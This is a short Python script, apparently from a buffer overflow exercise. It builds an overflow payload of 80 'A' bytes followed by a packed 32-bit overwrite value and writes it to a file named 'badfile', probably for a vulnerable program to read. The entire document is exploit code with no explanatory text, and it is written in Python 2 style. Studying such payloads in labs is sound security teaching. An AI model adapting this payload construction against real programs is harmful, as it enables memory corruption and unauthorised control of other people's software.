import struct

atk_vector = 'A'*80
atk_vector += struct.pack('I',0x01020305)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()
